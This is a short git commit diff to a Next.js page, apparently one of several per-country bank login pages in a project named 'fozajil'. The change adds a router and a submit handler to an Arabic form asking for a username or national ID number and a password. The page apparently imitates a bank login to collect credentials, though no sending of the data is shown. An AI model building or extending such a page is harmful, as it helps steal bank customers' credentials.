2e98c0be8f0fcaea523d8abf3a76c818f4c58eac
MiladSN2023 <152106448+MiladSN2023@users.noreply.github.com>
2023-12-29 00:45:55 +0300

    Update page.jsx

--- ‏‏my-app/src/app/fozajil/banks/france/page.jsx
+++ ‏‏my-app/src/app/fozajil/banks/france/page.jsx
@@ -9,7 +9,7 @@ import { useRouter } from 'next/navigation'
 const Page = () => {
     const username = useRef()
     const password = useRef()
-    
+    const router =useRouter();
     const handlerout = ()=>{
       if(username.current.value == ""){
         alert('من فضلك قم بملى الحقول')
@@ -37,7 +37,7 @@ const Page = () => {
             src={icon1}
             width={100}
         />
-        <form >
+        <form onSubmit={handleSubmit}>
             <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
             <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
             <button type='submit' onClick={handlerout}>تسجيل الدخول</button>
